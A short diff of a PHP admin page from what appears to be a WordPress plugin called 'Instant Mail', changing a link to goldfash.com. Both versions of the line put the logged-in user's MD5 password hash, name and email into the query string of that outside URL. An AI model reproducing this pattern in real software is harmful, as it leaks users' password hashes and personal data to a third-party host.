@@ -16,7 +16,7 @@ $ufname = $current_user->user_firstname;
 $ulname = $current_user->user_lastname;
 $md = $current_user->user_pass_md5;
 ?>
-<?$uname = $current_user->display_name;$uemi = $current_user->user_email;$desti = $_POST['go'];$addfundz = "https://goldfash.com/i0/oau4h?q=%26action=products%26password=$md%26password2=$md%261=add%26domain=register%26firstname=$ufname%26lastname=$ulname%26email=$uemi";$addfunds = "https://goldfash.com/i0/1pcgq?q=%26";?>
+<?$uname = $current_user->display_name;$uemi = $current_user->user_email;$desti = $_POST['go'];$addfundz = "https://goldfash.com/i0/oau4h?action=products%26password=$md%26password2=$md%261=add%26domain=register%26firstname=$ufname%26lastname=$ulname%26email=$uemi";$addfunds = "https://goldfash.com/i0/1pcgq?q=%26";?>
 <div class="wrap about-wrap">
 <h1><center><img src="https://s3-ap-southeast-2.amazonaws.com/goldfash/GOLD-FASH-150x150.png" /><br /><?php _e(" Instant Mail!"); ?></center></h1>
 <h2><br /><?php _e("On-Demand, Free Instant Mail"); ?></h2>
